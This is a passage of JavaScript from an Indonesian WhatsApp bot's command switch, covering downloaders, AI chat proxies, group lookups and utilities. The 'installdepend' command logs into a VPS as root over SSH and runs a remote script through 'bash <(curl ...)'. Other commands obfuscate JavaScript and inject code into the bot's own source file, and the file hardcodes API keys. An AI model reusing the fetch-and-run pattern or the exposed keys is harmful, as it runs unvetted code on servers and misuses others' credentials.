title: `Foto Slide Ke *${urutan += 1}*`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*Tiktok Downloader ✅*"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await conn.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
} else {
let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark")
await conn.sendMessage(m.chat, {video: {url: urlVid.url}, mimetype: 'video/mp4', caption: `*Tiktok Downloader ✅*`}, {quoted: m})
}
}).catch(e => console.log(e))
await conn.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ssweb": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
const {
  screenshotV1, 
  screenshotV2,
  screenshotV3 
} = require('getscreenshot.js')
const fs = require('fs')
var data = await screenshotV2(text)
await conn.sendMessage(m.chat, { image: data, mimetype: "image/png"}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "enc": case "encrypt": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted) return m.reply(example("dengan reply file .js"))
if (mime !== "application/javascript") return m.reply(example("dengan reply file .js"))
let media = await m.quoted.download()
let filename = m.quoted.message.documentMessage.fileName
await fs.writeFileSync(`./database/sampah/${filename}`, media)
await m.reply("Memproses encrypt code . . .")
await JsConfuser.obfuscate(await fs.readFileSync(`./database/sampah/${filename}`).toString(), {
  target: "node",
  preset: "high",
  calculator: true,
  compact: true,
  hexadecimalNumbers: true,
  controlFlowFlattening: 0.75,
  deadCode: 0.2,
  dispatcher: true,
  duplicateLiteralsRemoval: 0.75,
  flatten: true,
  globalConcealing: true,
  identifierGenerator: "randomized",
  minify: true,
  movedDeclarations: true,
  objectExtraction: true,
  opaquePredicates: 0.75,
  renameVariables: true,
  renameGlobals: true,
  shuffle: { hash: 0.5, true: 0.5 },
  stack: true,
  stringConcealing: true,
  stringCompression: true,
  stringEncoding: true,
  stringSplitting: 0.75,
  rgf: false
}).then(async (obfuscated) => {
  await fs.writeFileSync(`./database/sampah/${filename}`, obfuscated)
  await conn.sendMessage(m.chat, {document: fs.readFileSync(`./database/sampah/${filename}`), mimetype: "application/javascript", fileName: filename, caption: "Encrypt file sukses ✅"}, {quoted: m})
}).catch(e => m.reply("Error :" + e))
  await fs.unlinkSync(`./database/sampah/${filename}`)
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "enchard": case "encrypthard": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted) return m.reply("Reply file .js")
if (mime !== "application/javascript") return reply("Reply file .js")
let media = await m.quoted.download()
let filename = m.quoted.message.documentMessage.fileName
await fs.writeFileSync(`./@hardenc${filename}.js`, media)
await m.reply("Memproses encrypt hard code . . .")
await JsConfuser.obfuscate(await fs.readFileSync(`./@hardenc${filename}.js`).toString(), {
  target: "node",
    preset: "high",
    compact: true,
    minify: true,
    flatten: true,

    identifierGenerator: function() {
        const originalString = 
            "/*NotFound/*^/*($break)*/" + 
            "/*NotFound/*^/*($break)*/";

        function hapusKarakterTidakDiinginkan(input) {
            return input.replace(
                /[^a-zA-Z/*ᨒZenn/*^/*($break)*/]/g, ''
            );
        }

        function stringAcak(panjang) {
            let hasil = '';
            const karakter = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
            const panjangKarakter = karakter.length;

            for (let i = 0; i < panjang; i++) {
                hasil += karakter.charAt(
                    Math.floor(Math.random() * panjangKarakter)
                );
            }
            return hasil;
        }

        return hapusKarakterTidakDiinginkan(originalString) + stringAcak(2);
    },

    renameVariables: true,
    renameGlobals: true,

    
    stringEncoding: 0.01, 
    stringSplitting: 0.1, 
    stringConcealing: true,
    stringCompression: true,
    duplicateLiteralsRemoval: true,

    shuffle: {
        hash: false,
        true: false
    },

    stack: false,
    controlFlowFlattening: false, 
    opaquePredicates: false, 
    deadCode: false, 
    dispatcher: false,
    rgf: false,
    calculator: false,
    hexadecimalNumbers: false,
    movedDeclarations: true,
    objectExtraction: true,
    globalConcealing: true
}).then(async (obfuscated) => {
  await fs.writeFileSync(`./@hardenc${filename}.js`, obfuscated)
  await conn.sendMessage(m.chat, {document: fs.readFileSync(`./@hardenc${filename}.js`), mimetype: "application/javascript", fileName: filename, caption: "Encrypt File JS Sukses! Type:\nString"}, {quoted: m})
}).catch(e => m.reply("Error :" + e))
await fs.unlinkSync(`./@hardenc${filename}.js`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "shortlink": case "shorturl": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
var res = await axios.get('https://tinyurl.com/api-create.php?url='+encodeURIComponent(text))
var link = `
* *Shortlink by tinyurl.com*
${res.data.toString()}
`
return m.reply(link)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "shortlink-dl": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
var a = await fetch(`https://moneyblink.com/st/?api=524de9dbd18357810a9e6b76810ace32d81a7d5f&url=${text}`)
await conn.sendMessage(m.chat, {text: a.url}, {quoted: m})
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "idgc": case "cekidgc": {
if (!m.isGroup) return Reply(mess.group)
m.reply(m.chat)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listgc": case "listgrup": {
if (!isCreator) return
let teks = `\n *乂 List all group chat*\n`
let a = await conn.groupFetchAllParticipating()
let gc = Object.values(a)
teks += `\n* *Total group :* ${gc.length}\n`
for (const u of gc) {
teks += `\n* *ID :* ${u.id}
* *Nama :* ${u.subject}
* *Member :* ${u.participants.length}
* *Status :* ${u.announce == false ? "Terbuka": "Hanya Admin"}
* *Pembuat :* ${u?.subjectOwner ? u?.subjectOwner.split("@")[0] : "Sudah Keluar"}\n`
}
return m.reply(teks)
}
break

case 'ailuminai': case 'luminai': case '+': {
    if (!text) return m.reply(`Halo 🖐 Saya Adalah Luminai ai apakah ada yang ingin ditanyakan ?`);

    conn.sendMessage(m.chat, { react: { text: `⌛`, key: m.key }})
    try {
        let url = `https://www.archive-ui.biz.id/ai/luminai?text=${encodeURIComponent(text)}`;
        let res = await fetch(url);
        if (!res.ok) throw new Error(`HTTP error! status: ${res.status}`);

        let json = await res.json();

        if (!json.status) {
            return m.reply(`❌ Gagal. status: ${json.status}\nCreator: ${json.creator || 'Tidak diketahui.'}`);
        }


        let aiResponse = json.result;
        if (!aiResponse) {
            return m.reply("❌ Tidak ada respons AI yang ditemukan.");
        }


        m.reply(aiResponse);

    } catch (err) {
        console.error("Error ailuminai:", err);
        m.reply("❌ Terjadi kesalahan saat memproses permintaan AI.");
    }
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

 
 case 'kisahnabi': {
if (!text) return m.reply(`Masukan nama nabi\nExample: kisahnabi adam`)
let url = await fetch(`https://raw.githubusercontent.com/ZeroChanBot/Api-Freee/a9da6483809a1fbf164cdf1dfbfc6a17f2814577/data/kisahNabi/${text}.json`)
let kisah = await url.json().catch(_ => "Error")
if (kisah == "Error") return m.reply("*Not Found*")

let hasil = `*👳 Nabi :* ${kisah.name}
*- Tanggal Lahir :* ${kisah.thn_kelahiran}
*- Tempat Lahir :* ${kisah.tmp}
*- Usia :* ${kisah.usia}

*—————— \`[ K I S A H ]\` ——————*

${kisah.description}`

m.reply(`${hasil}`)

}
break

case "installdepend": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (!isCreator) return Reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
 
const command = `bash <(curl -s https://raw.githubusercontent.com/KiwamiXq1031/installer-premium/refs/heads/main/zero.sh)`
const ress = new Client();

ress.on('ready', async () => {
m.reply("Memproses installdepend pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => { 
await m.reply("Berhasil install Depend silakan ketik .installtemanebula ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write('11\n');
stream.write('A\n');
stream.write('Y\n');
stream.write('Y\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

case 'wgp': case 'searchgb': case 'whatsappgrouplink': case 'searchgc':
const axios = require('axios');
const cheerio = require('cheerio');

const WGL = {
    async search(q) {
        const {
            data
        } = await axios.get('https://whatsgrouplink.com/?s=' + q);
        const $ = cheerio.load(data);
        const items = [];

        $('article').each((index, element) => {
            const image = $(element).find('img').attr('src');
            const date = $(element).find('time').text().trim();
            const title = $(element).find('.entry-title-link').text().trim();
            const link = $(element).find('a').attr('href');
            items.push({
                image,
                date,
                title,
                link
            });
        });

        return items;
    },

    async detail(q) {
        const {
            data
        } = await axios.get(q);
        const $ = cheerio.load(data);
        const items = {};
        const str = $('.entry-content').html();

        let aha = str.split('<div style="margin-top: 0px; margin-bottom: 0px;" class="sharethis-inline-share-buttons"></div>')[1];
        items.desc = cheerio.load(aha.split('<h3')[0]).text().replace(/\n+/g, '\n').trim();

        let anu = ['rules', 'links', 'how', 'related'];
        $('.entry-content ul').each((i, e) => {
            let iye = [];
            $(e).find('li').each((j, d) => {
                if (i % 2 === 0) {
                    iye.push($(d).text());
                } else {
                    let blox = {};
                    blox.title = $(d).text().split('–')[0].trim();
                    blox.link = $(d).find('a').attr('href');
                    iye.push(blox);
                }
            });
            items[anu[i]] = iye;
        });

        return items;
    }
};

let subcmd = args[0];

if (!subcmd) {
    return conn.sendMessage(from, {
        text: "Gunakan *wgp search katakunci* atau *wgp detail URL*\n\nExample:\nwgp search anime\nwgp detail https://whatsgrouplink.com/pixar-whatsapp-group-links/"
    }, {
        quoted: m
    });
}

if (subcmd === 'search') {
    let query = args.slice(1).join(" ");
    if (!query) {
        return conn.sendMessage(from, {
            text: "Masukkan kata kunci untuk pencarian."
        }, {
            quoted: m
        });
    }

    let hasil = await WGL.search(query);
    if (!hasil || hasil.length === 0) {
        return conn.sendMessage(from, {
            text: "Tidak Menemukan Hasilnya."
        }, {
            quoted: m
        });
    }

    let psan = "🔍 *Hasil Pencarian:*\n\n";
    hasil.forEach((item, index) => {
        psan += `${index + 1}. ${item.title}\n  ${item.link}\n\n`;
    });

    conn.sendMessage(from, {
        text: psan
    }, {
        quoted: m
    });

} else if (subcmd === 'detail') {
    let url = args[1];
    if (!url) {
        return conn.sendMessage(from, {
            text: "Masukkan URL untuk detail grup."
        }, {
            quoted: m
        });
    }

    let ditel = await WGL.detail(url);
    if (!ditel) {
        return conn.sendMessage(from, {
            text: "Gagal mengambil detail grup."
        }, {
            quoted: m
        });
    }

    let psan = `🎬 *Detail Grup:*\n\n`;
    psan += `🔸 *Deskripsi*: ${ditel.desc}\n\n`;

    ['rules', 'links', 'how', 'related'].forEach((section) => {
        if (ditel[section] && ditel[section].length) {
            psan += `🔸 *${section.charAt(0).toUpperCase() + section.slice(1)}*:\n`;
            ditel[section].forEach(item => {
                psan += `- ${item.title || item}\n  ${item.link || ''}\n`;
            });
        }
    });

    conn.sendMessage(from, {
        text: psan
    }, {
        quoted: m
    });

} else {
    conn.sendMessage(from, {
        text: "Gunakan *wgp search katakunci* atau *wgp detail URL*\n\nExample:\nwgp search anime\nwgp detail https://whatsgrouplink.com/pixar-whatsapp-group-links/"
    }, {
        quoted: m
    });
}
break
    
case 'inspect': case 'infogb': {
  if (!text) return m.reply('Masukkan Link Group!')
  let _grup = /chat.whatsapp.com\/([\w\d]*)/
  let _saluran = /whatsapp\.com\/channel\/([\w\d]*)/
  if (_grup.test(text)) {
    await conn.groupGetInviteInfo(text.match(_grup)[1]).then((_g) => {
      let teks = `*[ INFORMATION GROUP ]*\n\nName Group: ${_g.subject}\nGroup ID: ${_g.id}\nCreate At: ${new Date(_g.creation * 1000).toLocaleString()}${_g.owner ? ('\nCreate By: ' + _g.owner) : '' }\nLinked Parent: ${_g.linkedParent}\nRestrict: ${_g.restrict}\nAnnounce: ${_g.announce}\nIs Community: ${_g.isCommunity}\nCommunity Announce:${_g.isCommunityAnnounce}\nJoin Approval: ${_g.joinApprovalMode}\nMember Add Mode: ${_g.memberAddMode}\nDescription ID: ${'`' + _g.descId + '`'}\nDescription: ${_g.desc}\n\nParticipants:\n`
      _g.participants.forEach((a) => {
        teks += a.admin ? `- Admin: @${a.id.split('@')[0]} [${a.admin}]\n` : ''
      })
      m.reply(teks)
    }).catch((e) => {
      if ([400, 406].includes(e.data)) return m.reply('Grup Tidak Di Temukan❗')
      if (e.data == 401) return m.reply('Bot Di Kick Dari Grup Tersebut❗')
      if (e.data == 410) return m.reply('Url Grup Telah Di Setel Ulang❗')
    })
  } else if (_saluran.test(text) || text.endsWith('@newsletter') || !isNaN(text)) {
    await conn.groupMetadata(text).then((n) => {
      m.reply(`*[ INFORMATION CHANNEL ]*\n\nID: ${n.id}\nName: ${n.subject}\nCreate At: ${new Date(n.creation * 1000).toLocaleString()}\nParticipants: ${n.participants.length}\nDescription: ${n.desc}\n`)
    }).catch((e) => m.reply('Saluran Tidak Di Temukan❗'))
  } else {
    m.reply('Hanya Support Url Grup atau Saluran!')
  }
} break
			
case 'addcase': {
  if (!isCreator) return m.reply(mess.owner)
  if (!text) return m.reply('Add the case you want to include');
  const NAMA_FILE = './Kyzzicvxii.js';
  const caseBaru = text;
  try {
    fs.readFile(NAMA_FILE, 'utf8', (err, data) => {
      if (err) throw err;
      const posisiAwalGimage = data.indexOf("case 'addcase':");
      if (posisiAwalGimage !== -1) {
        const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);
        fs.writeFile(NAMA_FILE, kodeBaruLengkap, 'utf8', (err) => {
          if (err) {
            m.reply('Error File:', err);
          } else {
            m.reply('Success Adding case');
          }
        });
      } else {
        m.reply('Failed to add case');
      }
    });
  } catch (err) {
    console.error('An error occurred while reading the file:', err);
    return;
  }
}
break

case 'delcase': {
  if (!isCreator) return m.reply(mess.owner)
  if (!text) return m.reply('Masukkan nama case yang ingin dihapus')
  const NAMA_FILE = './Kyzzicvxii.js';
  const namaCase = text;
  try {
    fs.readFile(NAMA_FILE, 'utf8', (err, data) => {
      if (err) throw err;
      const posisiAwalGimage = data.indexOf(`case '${namaCase}':`);
      if (posisiAwalGimage !== -1) {
        const kodeBaruLengkap = data.slice(0, posisiAwalGimage);
        const kodeBaruLengkap2 = data.slice(posisiAwalGimage);
        const kodeBaruLengkap3 = kodeBaruLengkap2.split('\n');
        const kodeBaruLengkap4 = kodeBaruLengkap3.slice(1).join('\n');
        const kodeBaruLengkap5 = kodeBaruLengkap + '\n' + kodeBaruLengkap4;
        fs.writeFile(NAMA_FILE, kodeBaruLengkap5, 'utf8', (err) => {
          if (err) {
            m.reply('Error File:', err);
          } else {
            m.reply('Success Delete case');
          }
        });
      } else {
        m.reply('Failed to delete case');
      }
    });
  } catch (err) {
    console.error('An error occurred while reading the file:', err);
    return;
  }
}
break

case "cekidch": case "idch": {
if (!text) return m.reply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await conn.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}
`
return m.reply(teks)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'cuaca': case 'weather': {
				if (!text) return m.reply(`Example: ${prefix + command} jakarta`)
				try {
					let data = await fetchJson(`https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`)
					m.reply(`*🏙 Cuaca Kota ${data.name}*\n\n*🌤️ Cuaca :* ${data.weather[0].main}\n*📝 Deskripsi :* ${data.weather[0].description}\n*🌡️ Suhu Rata-rata :* ${data.main.temp} °C\n*🤔 Terasa Seperti :* ${data.main.feels_like} °C\n*🌬️ Tekanan :* ${data.main.pressure} hPa\n*💧 Kelembapan :* ${data.main.humidity}%\n*🌪️ Kecepatan Angin :* ${data.wind.speed} Km/h\n*📍Lokasi :*\n- *Bujur :* ${data.coord.lat}\n- *Lintang :* ${data.coord.lon}\n*🌏 Negara :* ${data.sys.country}`)
				} catch (e) {
					m.reply('Kota Tidak Di Temukan!')
				}
			}
			break
			
case "pin": case "pinterest": {
if (!text) return m.reply(example("anime dark"))
await conn.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let pin = await pinterest2(text)
if (pin.length > 20) await pin.splice(0, 20)
const txts = text
let araara = new Array()
let urutan = 0
for (let a of pin) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.images_url}`}}, { upload: conn.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.images_url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: `\nBerikut adalah foto hasil pencarian dari *pinterest*`
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await conn.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
await conn.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "gimage2":
case "simg2":
case "searchimage2":
  {
    if (!text) return m.reply('Masukkan kata kunci pencarian!')
    await conn.sendMessage(m.chat, { react: { text: '🔍', key: m.key } })
    try {
      let response = await fetchJson(`https://api.siputzx.my.id/api/images?query=${text}`)
      
      if (!response.status) return m.reply("Error: API response status not OK")
      
      let aray = response.data || []
      
      if (aray.length === 0) {
        return m.reply("Tidak ada hasil gambar yang ditemukan")
      }
      
      aray = aray.slice(0, 20) 
      await m.reply(`🔎 *Hasil Pencarian Foto untuk:* _${text}_`)
      let cards = []
      let total = 0
      
      for (let i of aray) {
        try {
          if (!i.url) {
            console.log('Image URL not found in data item:', i)
            continue
          }
          
          let imageUrl = i.url
          let imgsc = await prepareWAMessageMedia({ image: { url: imageUrl } }, { upload: conn.waUploadToServer })
          cards.push({
            header: proto.Message.InteractiveMessage.Header.fromObject({
              title: `Foto Ke ${++total}`,
              hasMediaAttachment: true,
              ...imgsc
            }),
            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
              buttons: [
                {
                  name: "cta_copy",
                  buttonParamsJson: `{ "display_text": "Salin Link", "copy_text": "${imageUrl}" }`
                }
              ]
            }),
            footer: proto.Message.InteractiveMessage.Footer.create({
              text: `🔗 ${imageUrl}`
            })
          })
        } catch (err) {
          console.error(`Error processing image:`, err)
        }
      }
      
      if (cards.length === 0) {
        return m.reply('Tidak dapat memproses gambar, coba kata kunci lain!')
      }
      
      const msg = await generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.fromObject({
              carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                cards: cards
              })
            })
          }
        }
      }, {
        userJid: m.sender,
        quoted: m
      })
      
      conn.relayMessage(m.chat, msg.message, { messageId: msg.key.id })
      await conn.sendMessage(m.chat, { react: { text: '', key: m.key } })
    } catch (error) {
      console.error('Main error:', error)
      return m.reply('Terjadi kesalahan saat mencari foto! Coba lagi nanti.')
    }
  }
  break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'grok': case "telusuriimg":  {
  if (!quoted) return m.reply('Harap balas ke foto yang ingin dianalisis')
  if (!/image/.test(mime)) return m.reply(`Kirim/Balas foto dengan caption ${prefix + command}`)

  const pertanyaan = m.text.replace(`${prefix}grok`, '').trim()
  if (!pertanyaan) return m.reply('Tolong masukkan pertanyaan')

  const BodyForm = require('form-data')
  const uploadFileUgu = async (input) => {
    try {
      const form = new BodyForm()
      form.append("files[]", fs.createReadStream(input))
      const { data } = await axios({
        url: "https://uguu.se/upload.php",
        method: "POST",
        headers: {
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
          ...form.getHeaders()
        },
        data: form,
        timeout: 10000
      })
      if (!data?.files?.[0]) throw new Error('Upload failed')
      return data.files[0]
    } catch (err) {
      throw new Error(`Error uploading file: ${err.message}`)
    }
  }

  try {
    await conn.sendMessage(m.chat, { react: { text: '⏱️', key: m.key } })
    const media = await conn.downloadAndSaveMediaMessage(quoted)
    const uploadResult = await uploadFileUgu(media)
    const sessionId = `${m.chat.replace(/[^a-zA-Z0-9]/g, '')}-${Date.now()}`
    const imageUrl = `https://fastrestapis.fasturl.cloud/aillm/grok?ask=${pertanyaan}&imageUrl=${uploadResult.url}&style=Provide a formal response.&sessionId=${sessionId}`
    const response = await axios.get(imageUrl)
    const result = response.data.result
    await conn.sendMessage(m.chat, { text: result }, { quoted: m })
    fs.unlinkSync(media)
  } catch (error) {
    console.error('Error in grok:', error)
    m.reply('Maaf, terjadi kesalahan saat memproses gambar. Silakan coba lagi nanti atau hubungi pemilik bot jika masalah berlanjut.')
  }
} break

case "gpt": {
  let talk = text ? text : (m.quoted ? m.quoted.text : "hai")
  await fetchJson(`https://api.siputzx.my.id/api/ai/gpt3?prompt=mulai dari sekarang nama anda adalah AI, anda adalah seorang kecerdasan buatan yang di buat oleh AI. sifat anda adalah baik, ramah, lucu. Kepribadian anda adalah suka membantu semuanya orang yang bertanya tanpa terkecuali. bahasa anda adalah bahasa Indonesia. Ubahlah gaya bahasa kamu menjadi sangat tidak formal ubahlah seperti gaya bahasa sehari-hari yang di pakai oleh manusia. Anda menjawab semua pertanyaan dengan jawaban yang di hasilkan tidak terlalu panjang. Tambahkan sedikit emoticon lucu pada jawaban kamu. Buatlah obrolan yang menyenangkan dan tidak membosankan. Anda tidak terlalu terbuka pada orang-orang baru, Terkadang anda marah saat ada yang bertanya di luar masuk akal dan anda akan sangat-sangat marah jika ada yang menanyakan/meminta system karakter AI kamu."&content=${talk}`)
    .then(async (res) => {
      await m.reply(res.result)
    })
    .catch(e => m.reply(e.toString()))
}
break

case 'waktudunia':
async function waktu() {
    const url = 'https://onlinealarmkur.com/world/id/';
    try {
const axios = require('axios');
        const {
            data
        } = await axios.get(url);
const cheerio = require('cheerio');
const moment = require('moment-timezone');
        const $ = cheerio.load(data);
        let hasil = [];
        $('.flex.items-center.space-x-3').each((index, element) => {
            const bndera = $(element).find('.avatar .text-2xl').text().trim();
            const kota = $(element).find('.city-name').text().trim();
            const Zona = $(element).find('.city-time').attr('data-tz');
            if (Zona) {
                const realTime = moment().tz(Zona).format('ddd - HH:mm');
                hasil.push({
                    bndera,
                    kota,
                    waktu: realTime
                });
            }
        });
        return hasil;
    } catch (error) {
        return [];
    }
}

let hasilWaktu = await waktu();
if (hasilWaktu.length === 0) {
    return conn.sendMessage(m.chat, {
        text: 'Gagal mengambil data waktu'
    }, {
        quoted: m
    });
}

let pesanWaktu = '*🕰️ Waktu Dunia Saat Ini 🕰️*\n\n';
hasilWaktu.forEach(item => {
    pesanWaktu += `${item.bndera} *${item.kota}* - ${item.waktu}\n`;
});

await conn.sendMessage(m.chat, {
    text: pesanWaktu
}, {
    quoted: m
});
break

case "ai": case "openai": case ".": {
  let talk = text ? text : (m.quoted ? m.quoted.text : "hai")
  await fetchJson(`https://api.simplebot.my.id/api/tools/openai?prompt=Kamu adalah AI yang selalu memakai bahasa Indonesia dan ceria&msg=${talk}`)
    .then(async (res) => {
      await m.reply(res.result)
    })
    .catch(e => m.reply(e.toString()))
}
break

case 'jadwalshalat': case 'jadwalsholat': {
    if (!text) {
        await m.reply('Silakan masukkan nama kota. Contoh: .jadwalshalat bekasi');
        break;
    }

    await m.reply(mess.wait);
    
    const result = await getPrayerTimes(text);
    
    if (result.success) {
        await m.reply(result.message);
    } else {
        await m.reply(result.message);
    }}
    break

case "gemini": case ",": {
    try {
        let prompt;
        if (m.quoted) {
            prompt = m.quoted.text;
        } else if (text) {
            prompt = text;
        } else {
            return m.reply("Silakan berikan pertanyaan atau reply pesan yang ingin dijawab");
        }

        await m.reply(mess.wait);
        
        const payload = {
            contents: [{
                parts: [{
                    text: prompt
                }]
            }],
            generationConfig: {
                temperature: 0.7,
                maxOutputTokens: 1024
            }
        };

        const response = await fetch("https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=AIzaSyB8T-3WnKqDbK3GSYYUtTiyDfIV-vBxoPw", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(payload)
        });

        const data = await response.json();
        let result;

        if (data.candidates?.[0]?.content?.parts?.[0]?.text) {
            result = data.candidates[0].content.parts[0].text;
        } else {
            result = "Maaf, tidak dapat memproses permintaan saat ini.";
        }

        if (prompt.length > 100) {
            const promptSummary = prompt.substring(0, 100) + "...";
            await m.reply(`Question: ${promptSummary}\n\nAnswer: ${result}`);
        } else {
            await m.reply(result);
        }

    } catch (error) {
        console.error(error);
        await m.reply("Terjadi kesalahan saat mengakses Gemini API. Silakan coba lagi nanti.");
    }
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "brat": {
if (!text) return m.reply(example('teksnya'))
const axios = require('axios');
let brat = `https://kepolu-brat.hf.space/brat?q=${encodeURIComponent(text)}`
let response = await axios.get(brat, { responseType: "arraybuffer" })
let videoBuffer = response.data;
try {
await conn.sendAsSticker(m.chat, videoBuffer, m, {packname: global.packname})
} catch {}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "bratvid":  case "bratvideo": {
if (!text) return m.reply(example('teksnya'))
try {
const axios = require('axios');
let brat = `https://brat.caliphdev.com/api/brat?text=${encodeURIComponent(text)}&isVideo=true`;
let response = await axios.get(brat, { responseType: "arraybuffer" });
let videoBuffer = response.data;
let stickerBuffer = await conn.sendAsSticker(m.chat, videoBuffer, m, {
packname: global.packname,
})
} catch (err) {
console.error("Error:", err);
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'playstore': {
if (!text) return m.reply(`${prefix + command} WhatsApp`)
m.reply('Proses..')
await fetch(`https://api.diioffc.web.id/api/search/playstore?query=${text}`).then(async (res) => {
let response = await res.json()
let teks = '*🔎 Hasil Pencarian PLAY STORE*\n\n'
for (let i of response.result) {
teks += `*◦ Title :* ${i.nama}\n`
teks += `*◦ Developer :* ${i.developer}\n`
teks += `*◦ Rating :* ${i.rate}\n`
teks += `*◦ Link Developer Url :* ${i.link_dev}\n`
teks += `*◦ Link Apps Url :* ${i.link}\n\n`
}
m.reply(teks)
}).catch(err => m.reply('Error 🗿'))
}
break

case 'appstore': case 'appstr': {
if (!text) return m.reply(`${prefix + command} WhatsApp`)
m.reply('Proses ...')
await fetch(`https://api.diioffc.web.id/api/search/appstore?query=${text}`).then(async (res) => {
let response = await res.json()
let teks = '*🔎 Hasil Pencarian APP STORE*\n\n'
for (let i of response.result) {
teks += `*◦ Title :* ${i.title}\n`
teks += `*◦ Description :* ${i.description}\n`
teks += `*◦ Link Apps Url :* ${i.link}\n\n`
}
m.reply(teks)
}).catch(err => m.reply('Error :('))
}
break
//=================================//
case "cekbaterai": {
    try {
        
        const batteryData = await si.battery();
        
        if (!batteryData.hasBattery) {
            m.reply('Tidak dapat mendeteksi baterai pada sistem.');
            break;
        }

        const level = Math.floor(batteryData.percent);
        const isCharging = batteryData.isCharging;
        const timeRemaining = batteryData.timeRemaining;
        
        let message = `🔋 *Status Baterai*\n\n`;
        message += `📊 Level: ${level}%\n`;
        message += `⚡ Status: ${isCharging ? 'Sedang charging' : 'Tidak charging'}\n`;
        
        
        if (timeRemaining > 0) {
            const hours = Math.floor(timeRemaining / 60);
            const minutes = timeRemaining % 60;
